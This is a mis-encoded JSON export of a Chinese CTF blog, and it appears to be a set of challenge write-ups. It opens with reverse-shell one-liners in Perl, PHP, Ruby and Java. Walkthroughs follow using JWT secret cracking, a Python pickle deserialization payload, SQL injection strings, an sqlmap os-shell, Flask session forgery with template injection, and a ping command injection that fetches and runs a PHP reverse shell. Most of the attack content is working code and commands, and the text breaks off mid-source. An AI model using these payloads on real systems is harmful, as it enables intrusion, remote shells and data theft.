Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;#PHPåå¼¹php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3&quot;);&#x27;#Rubyåå¼¹ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d&gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;#Javaåå¼¹r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \\$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"ikun","slug":"ikun","date":"2020-12-06T11:40:55.000Z","updated":"2020-12-06T13:50:06.117Z","comments":true,"path":"2020/12/06/ikun/","link":"","permalink":"http://example.com/2020/12/06/ikun/","excerpt":"","text":"è€ƒç‚¹ Pythoné€»è¾‘æ¼æ´ JWTä¼ªé€  è¿‡ç¨‹ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çˆ†ç ´æ‰¾åˆ°LV6è´¦å·ï¼š 123456789import requestsfor i in range(1,999): url = &quot;http://25bf3014-fd74-4f4e-882b-5b310346732e.node3.buuoj.cn/shop?page=&#123;&#125;&quot;.format(i) res = requests.get(url) if &quot;lv6.png&quot; in res.text: print(i) break è´­ä¹°çš„æ—¶å€™å¤šç‚¹å‡ ä¸‹è§¦å‘æ‰“æŠ˜ï¼Œç„¶åæˆ‘ä»¬æ‰‹åŠ¨æŠŠæŠ˜æ‰£æ”¹çš„ç‰¹åˆ«ä½ å¾—åˆ°urlï¼š 1b1g_m4mber éœ€è¦æˆ‘ä»¬ç”¨adminç™»é™†ï¼Œçœ‹çœ‹è‡ªå·±çš„æƒ…å†µï¼Œå¤§æ¦‚åªèƒ½ç”¨JWTä¼ªé€ äº†ï¼Œæ²¡æœ‰å¯†é’¥ä¸¢è¿›å»çˆ†ç ´å¥½äº†ï¼š 123ysllz@kali:~/æ¡Œé¢/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.8iYM4QgkAw4NpjpP8tEn7MBbZoF-Kj8YRbosz3Qrr-QSecret is &quot;1Kun&quot; åœ¨è¿™ä¸ªurlä¸‹é¢ï¼š 1https:&#x2F;&#x2F;jwt.io&#x2F; ç¼–è¯‘ä¹‹åå¾—åˆ°ï¼š 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo ä¹‹åå»ä¸ªäººä¸­å¿ƒçš„é‚®ç®±åœ°å€ä¸‹é¢ç»™äº†ä¸ªhintï¼š 1é‚®ç®±åœ°å€ï¼šhint: \\u8fd9\\u7f51\\u7ad9\\u4e0d\\u4ec5\\u53ef\\u4ee5\\u4ee5\\u8585\\u7f8a\\u6bdb\\uff0c\\u6211\\u8fd8\\u7559\\u4e86\\u4e2a\\u540e\\u95e8\\uff0c\\u5c31\\u85cf\\u5728\\u006c\\u0076\\u0036\\u91cc å¾—åˆ°è¿™å¥è¯ï¼š 1è¿™ç½‘ç«™ä¸ä»…å¯ä»¥ä»¥è–…ç¾Šæ¯›ï¼Œæˆ‘è¿˜ç•™äº†ä¸ªåé—¨ï¼Œå°±è—åœ¨lv6é‡Œ 1234567&lt;div class=&quot;ui text container login-wrap-inf&quot;&gt;&lt;!-- æ½œä¼æ•Œåå·²ä¹…,åªèƒ½å¸®åˆ°è¿™äº† --&gt;&lt;a href=&quot;/static/asd1f654e683wq/www.zip&quot; &gt;&lt;span style=&quot;visibility:hidden&quot;&gt;åˆ åº“è·‘è·¯å‰æˆ‘ç•™äº†å¥½ä¸œè¥¿åœ¨è¿™é‡Œ&lt;/span&gt;&lt;/a&gt;&lt;div class=&quot;ui segments center padddd&quot;&gt;&lt;!-- å¯¹æŠ—*ç«™é»‘ç§‘æŠ€ï¼Œç›®å‰ä¸ºæµ‹è¯•é˜¶æ®µï¼Œåªå¯¹ç®¡ç†å‘˜å¼€æ”¾ --&gt;&lt;div class=&quot;ui segment&quot;&gt;&lt;img src=&quot;/static/img/b.png&quot; alt=&quot;&quot;/&gt; æŠŠæºç dumpä¸‹æ¥ï¼Œåœ¨Admin.pyå½“ä¸­æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è§¦å‘ç‚¹ 12345678910111213141516171819202122import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == &quot;admin&quot;: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) else: return self.render(&#x27;no_ass.html&#x27;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(&#x27;become&#x27;) p = pickle.loads(urllib.unquote(become)) return self.render(&#x27;form.html&#x27;, res=p, member=1) except: return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0) æ‰¾äº†ä¸€ç¯‡å†™pickleçš„åšå®¢ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;article&#x2F;details&#x2F;79027055 12345678910111213import pickle# data = &#123;&#x27;foo&#x27;: [1,2,3],# &#x27;bar&#x27;: (&#x27;Hello&#x27;, &#x27;world!&#x27;),# &#x27;baz&#x27;: True&#125;# jar = open(&#x27;data.pkl&#x27;, &#x27;wb&#x27;)# pickle.dump(data, jar) # å°†pickleåçš„æ•°æ®å†™å…¥jaræ–‡ä»¶# jar.close()pkl_file = open(&#x27;data.pkl&#x27;,&#x27;rb&#x27;)data = pickle.load(pkl_file)print(data)pkl_file.close() å¤§æ¦‚è¿‡ç¨‹å°±è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„éœ€è¦çš„æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå½“æˆ‘ä»¬çš„æ–‡ä»¶ç»è¿‡æºç ä¸­çš„ 1p = pickle.loads(urllib.unquote(become)) loadsè¿‡ç¨‹ï¼Œæˆ–è€…è¯´æ˜¯urlib.unquoteçš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘çš„é­”æœ¯æ–¹æ³•æ‰å¯ä»¥ åœ¨å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 12345__reduce__(self)å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ __reduce__ è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒè¦ä¹ˆè¿”å›ä¸€ä¸ªä»£è¡¨å…¨å±€åç§°çš„å­—ç¬¦ä¸²ï¼ŒPyhtonä¼šæŸ¥æ‰¾å®ƒå¹¶pickleï¼Œè¦ä¹ˆè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚è¿™ä¸ªå…ƒç»„åŒ…å«2åˆ°5ä¸ªå…ƒç´ ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼šä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºé‡å»ºå¯¹è±¡æ—¶è°ƒç”¨ï¼›ä¸€ä¸ªå‚æ•°å…ƒç´ ï¼Œä¾›é‚£ä¸ªå¯è°ƒç”¨å¯¹è±¡ä½¿ç”¨ï¼›è¢«ä¼ é€’ç»™ __setstate__ çš„çŠ¶æ€ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„åˆ—è¡¨å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›ä¸€ä¸ªäº§ç”Ÿè¢«pickleçš„å­—å…¸å…ƒç´ çš„è¿­ä»£å™¨ï¼ˆå¯é€‰ï¼‰ï¼›__reduce_ex__(self)__reduce_ex__ çš„å­˜åœ¨æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚å¦‚æœå®ƒè¢«å®šä¹‰ï¼Œåœ¨pickleæ—¶ __reduce_ex__ ä¼šä»£æ›¿ __reduce__ è¢«è°ƒç”¨ã€‚ __reduce__ ä¹Ÿå¯ä»¥è¢«å®šä¹‰ï¼Œç”¨äºä¸æ”¯æŒ __reduce_ex__ çš„æ—§ç‰ˆpickleçš„APIè°ƒç”¨ã€‚ åœ¨è¿™é‡Œåªèƒ½ä½¿ç”¨reduceè¿™ä¸€é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºä»…ä»…æœ‰è¯¥é­”æœ¯æ–¹æ³•ä¼šå‘Šè¯‰Pythonä½ çš„æ–‡ä»¶è¢«pickleè°ƒç”¨çš„æ—¶å€™è¯¥å¦‚ä½•ä½¿ç”¨å®ƒâ€¦ æ•…æˆ‘ä»¬ç”¨è¯¥é­”æœ¯æ–¹æ³•ç”Ÿæˆpayload 12345678910111213import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print ac__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"SWPUCTF","slug":"SWPUCTF","date":"2020-12-06T09:07:55.000Z","updated":"2020-12-06T11:29:57.734Z","comments":true,"path":"2020/12/06/SWPUCTF/","link":"","permalink":"http://example.com/2020/12/06/SWPUCTF/","excerpt":"","text":"ç¬¬ä¸€æ­¥é€šè¿‡æ‰«ç›®å½•èƒ½å¤Ÿå¾—åˆ°Index.php.bak,å¾—å‡ºå¦‚ä¸‹ï¼š 123456789GET /important_index_its_so_long_right.php?id=1 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1 åœ¨è¿™ä¸ªurlä¸‹é¢å¯ä»¥è¿›è¡Œæ³¨å…¥ 1http:&#x2F;&#x2F;182.150.46.187:8802&#x2F;important_index_its_so_long_right.php?id&#x3D;1 æ‰«å‡ºæ¥å¯†ç ï¼š 12345+----------------------------------+----------+------+| pwd | usn | id |+----------------------------------+----------+------+| f1097380e513e86f2c1548cc1094bf4e | admin123 | 1 |+----------------------------------+----------+------+ somd5è§£å¯†å¯ä»¥å¾—å‡ºï¼šwllm@123ï¼Œè¿™ä¸ªå¯ä»¥ç™»é™†åå°ï¼Œh1ntæˆ‘ä»¬ä¹Ÿå¯ä»¥å»æ³¨å…¥å‡ºæ¥ä¸œè¥¿ 12345+------+--------------------------------------+--------+| id | hint | user |+------+--------------------------------------+--------+| 1 | last_index_come_on_swpu_ctf.php?id=4 | 00001 |+------+--------------------------------------+--------+ ç™»é™†åå°ï¼š æºç ä¸­å¯ä»¥çœ‹è§ï¼šwriteuser_00001_log.log 123456789101112131415L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToxNi9pcDoxMjcuMC4wLjEvdmlldzp3aWZlLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMToyMC9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyMjozMy9pcDoxMjcuMC4wLjEvdmlldzpqaWF5b3UuaHRtbA==L3VzZXI6MDAwMDEvdGltZToxMDoyMToyNToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbmlzdHJhdG9yLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMToyOToxNi9pcDoxMjcuMC4wLjEvdmlldzpkYXFpLmh0bWw=L3VzZXI6MDAwMDEvdGltZToxMDoyMjoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZW8ucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyMzoyMToxNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyNDoyMzoxNC9pcDoxMjcuMC4wLjEvdmlldzplY3kucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyNjoyMTozMy9pcDoxMjcuMC4wLjEvdmlldzpob21lLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMTo1Ni9pcDoxMjcuMC4wLjEvdmlldzppbmRleC5waHA=L3VzZXI6MDAwMDEvdGltZToxMDoyNzoyMzoxNi9pcDoxMjcuMC4wLjEvdmlldzp1cF9sb19hZF9hZF9taW4ucGhwL3VzZXI6MDAwMDEvdGltZToxMDoyODoyMjoyNi9pcDoxMjcuMC4wLjEvdmlldzptZXNzLnBocA==L3VzZXI6MDAwMDEvdGltZToxMDoyODoyNToyNi9pcDoxMjcuMC4wLjEvdmlldzo0MDQuaHRtbA==L3VzZXI6MDAwMDEvdGltZToxMDoyOToxOToxNi9pcDoxMjcuMC4wLjEvdmlldzphZG1pbi5waHA= å…¨éƒ¨è§£å¯†å‡ºæ¥ï¼Œup_lo_ad_ad_min.phpï¼š è®¿é—®ï¼š 12éæ³•æ–‡ä»¶ç±»å‹è¯·å…ˆå»up_lo_ad_er_security.phpè¿›è¡Œç™»å½• ç”¨user 00001å»ç™»é™†ï¼Œå‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œç»“åˆä¹‹å‰çš„sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨è¿™é‡Œå†™shellè¿›å»è·å–æƒé™ 1234545948ä¸Šä¼ æ–‡ä»¶å: 1 (2).jpgæ–‡ä»¶ç±»å‹: image/jpegæ–‡ä»¶å¤§å°: 44.87109375 kBæ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: /tmp/phpJluzIgæ–‡ä»¶å­˜å‚¨åœ¨: upl_oad_pat_h/1 (2).jpg å¯ä»¥å°†shellä¸Šä¼ åˆ°upl_oad_pat_hç›®å½•ä¸‹ 12345678910111213141516171819which web application language does the web server support?[1] ASP[2] ASPX[3] JSP[4] PHP (default)&gt; 4[17:30:56] [WARNING] unable to automatically retrieve the web server document rootwhat do you want to use for writable directory?[1] common location(s) (&#x27;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs&#x27;) (default)[2] custom location(s)[3] custom directory list file[4] brute force search&gt; 2os-shell&gt; cat /flagdo you want to retrieve the command standard output? [Y/n/a] ycommand standard output: &#x27;flag&#123;d1ddddhm_swpu_e@sy_h@ck&#125;&#x27;os-shell&gt;","categories":[],"tags":[]},{"title":"N1BOOK","slug":"N1BOOK","date":"2020-12-03T06:31:16.000Z","updated":"2020-12-04T12:07:01.390Z","comments":true,"path":"2020/12/03/N1BOOK/","link":"","permalink":"http://example.com/2020/12/03/N1BOOK/","excerpt":"","text":"1-4æ²¡å•¥å¥½è¯´çš„arf_2åˆ©ç”¨nginxçš„è§£æé”™è¯¯ SQLæ³¨å…¥2ä¸€ä¸ªæŠ¥é”™æ³¨å…¥ 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(table_name) from information_schema.tables where table_schema=database() ))) # 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(column_name) from information_schema.columns where table_name=&#x27;fl4g&#x27; ))) # afr_3ä¸ä¼šäº†ï¼Œå­¦ä¹ äº†ã€‚ å½“æˆ‘ä»¬è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¯»å–proc/self/cmdlineç›®å½•æ¥æŸ¥çœ‹ç³»ç»Ÿæ‰§è¡Œäº†ä»€ä¹ˆå‘½ä»¤ 123456/proc/cmdline åœ¨å¯åŠ¨æ—¶ä¼ é€’è‡³å†…æ ¸çš„ç›¸å…³å‚æ•°ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸ç”±liloæˆ–grubç­‰å¯åŠ¨ç®¡ç†å·¥å…·è¿›è¡Œä¼ é€’ï¼› [root@rhel5 ~]# more /proc/cmdline ro root=/dev/VolGroup00/LogVol00 rhgb quiet åœ¨è¿™é‡Œå°±èƒ½çœ‹è§server.pyäº†ï¼Œäºæ˜¯å†å»proc/self/cwdç›®å½•ä¸‹è¯»å–è¿™ä¸ªæ–‡ä»¶ 1cwd â€” æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼› ä¹Ÿå°±æ˜¯è¯´cwdä¸‹å¯ä»¥è¿æ¥åˆ°æ‰€æœ‰å½“å‰æ­£åœ¨å¯åŠ¨çš„è¿›ç¨‹çš„å·¥ä½œç›®å½• äºæ˜¯æ„é€ ï¼š 1http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py å¾—åˆ°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import osfrom flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )from flask_session import Sessionapp = Flask(__name__)execfile(&#x27;flag.py&#x27;)execfile(&#x27;key.py&#x27;)FLAG = flagapp.secret_key = key@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def n1page(): if request.method != &quot;POST&quot;: return redirect(url_for(&quot;index&quot;)) n1code = request.form.get(&quot;n1code&quot;) or None if n1code is not None: n1code = n1code.replace(&quot;.&quot;, &quot;&quot;).replace(&quot;_&quot;, &quot;&quot;).replace(&quot;&#123;&quot;,&quot;&quot;).replace(&quot;&#125;&quot;,&quot;&quot;) if &quot;n1code&quot; not in session or session[&#x27;n1code&#x27;] is None: session[&#x27;n1code&#x27;] = n1code template = None if session[&#x27;n1code&#x27;] is not None: template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;] session[&#x27;n1code&#x27;] = None return render_template_string(template)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;main.html&quot;)@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])def article(): error = 0 if &#x27;name&#x27; in request.args: page = request.args.get(&#x27;name&#x27;) else: page = &#x27;article&#x27; if page.find(&#x27;flag&#x27;)&gt;=0: page = &#x27;notallowed.txt&#x27; try: template = open(&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;.format(page)).read() except Exception as e: template = e return render_template(&#x27;article.html&#x27;, template=template)if __name__ == &quot;__main__&quot;: app.run(host=&#x27;0.0.0.0&#x27;, debug=False) çœ‹è§flagè¢«è¿‡æ»¤äº†ï¼Œè¯»ä¸€ä¸‹key.py 1Drmhze6EPcv0fN_81Bj-nA çŒ›æµ‹äº†ä¸€æ³¢ 12345678910111213141516171819.eJyrVsozTM5PSVWyUqquVoiO1YuPT85JLC6Ojweycovy4-OjdQ1BosWlSWCJVKCUhma0qSVIMDMvswSsMj0nPykxB6IrqTQzpyQzD8hRUKitVaoFALt_IyQ.X8irqA.tYkx2Q2zmFaN_M5JnsennKV32nIroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpWzQwXSB9fSJ9.X8isNQ.mwsFCJ2g4ZXyuONHb9SWzKEHrVkroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1syXS5fX3N1YmNsYXNzZXNfXygpIH19In0.X8isRA._rfFegMxGGcZG8hbm0Et10WBnFIroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7ey5fX2NsYXNzX18uX19tcm9fX1stMV0uX19zdWJjbGFzc2VzX18oKSB9fSJ9.X8isYg.HxdhLvdW6lQkPiK3HHLXq7safdUroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &#x27;&#123;&quot;n1code&quot;: &quot;&#123;&#123;\\&#x27;\\&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;&quot;&#125; &#x27; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;bash: æœªé¢„æœŸçš„ç¬¦å·â€œ(â€é™„è¿‘æœ‰è¯­æ³•é”™è¯¯root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKCkgfX0ifQ.X8isow.oTg9cFIhfKJan3dvrWECrR8Y4xsroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40] &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdIH19In0.X8iswQ.4rU8qOrp7diJa_N5IjdCwm0EvLQroot@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;) &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykgfX0ifQ.X8is5w.TImXqmpXkV0tjZzmcVFAIvvFP28root@kali:/flask-session-cookie-manager# python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27;eyJuMWNvZGUiOiJ7eycnLl9fY2xhc3NfXy5fX21yb19fWzJdLl9fc3ViY2xhc3Nlc19fKClbNDBdKCdmbGFnLnB5JykucmVhZCgpIH19In0.X8is9Q._7aNNdKqdaXGJ6mbSLLA1W9wjBQroot@kali:/flask-session-cookie-manager# æœ€åæ‰æˆåŠŸï¼š 1python3 flask_session_cookie_manager3.py encode -t &quot;&#123;\\&quot;n1code\\&quot;: \\&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag.py&#x27;).read() &#125;&#125;\\&quot;&#125;&quot; -s &#x27;Drmhze6EPcv0fN_81Bj-nA&#x27; [ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤è¿™ä¸ªé¢˜ç›®çš„pingèƒ½å¤Ÿå‡ºå¤–ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ç”¨%0aå°†pingæ¢è¡Œç»•è¿‡ ä¹‹åcurl [ip]/xxx.php &gt;&gt;/tmp/xx phpå¯ä»¥å†™ä¸€ä¸ªåå¼¹shellæ–‡ä»¶ï¼Œè¿™é‡Œæ¯”å¦‚æˆ‘ä»¬ç”¨Pç‰›çš„ï¼š 12345678910&lt;?php$sock = fsockopen(&quot;$IP&quot;, $port);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open(&#x27;/bin/sh&#x27;, $descriptorspec, $pipes);proc_close($process); ?&gt; ä¹‹åæˆ‘ä»¬å†æ‰§è¡Œå‘½ä»¤ 1%0aphp /tmp/xx å³å¯åå¼¹shell [ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼ çŸ¥è¯†ç‚¹ï¼š1.apacheè‡ªå¸¦çš„æ–‡ä»¶è§£ææ¼æ´å¦‚æœapacheè¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œåç¼€ä¸ºå…¶ä¸å¯è§£æçš„æ–‡ä»¶ååç¼€ï¼Œå°±ä¼šå‘ä¸Šè¿½æº¯ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„apacheè§£æ 1aaa.php.xxx å› ä¸ºapacheæ— æ³•è§£æxxx,æ‰€ä»¥apacheå°±ä¼šè§£æå‰ä¸€ä¸ªï¼Œå°±æ˜¯aaa.phpäº†ã€ä½†æ˜¯æˆ‘ä»¬è®¿é—®çš„æ—¶å€™ä¾ç„¶ç”¨aaa.php.xxxå»è®¿é—® 2.é€»è¾‘æ¼æ´é¢˜ç›®æ˜¯ç»™å‡ºæºä»£ç çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126&lt;?phpheader(&quot;Content-Type:text/html; charset=utf-8&quot;);// æ¯5åˆ†é’Ÿä¼šæ¸…é™¤ä¸€æ¬¡ç›®å½•ä¸‹ä¸Šä¼ çš„æ–‡ä»¶require_once(&#x27;pclzip.lib.php&#x27;);if(!$_FILES)&#123; echo &#x27;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot; /&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ ç« èŠ‚ç»ƒä¹ é¢˜&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; .login-box&#123; margin-top: 100px; height: 500px; border: 1px solid #000; &#125; body&#123; background: white; &#125; .btn1&#123; width: 200px; &#125; .d1&#123; display: block; height: 400px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;login-box col-md-12&quot;&gt; &lt;form class=&quot;form-horizontal&quot; 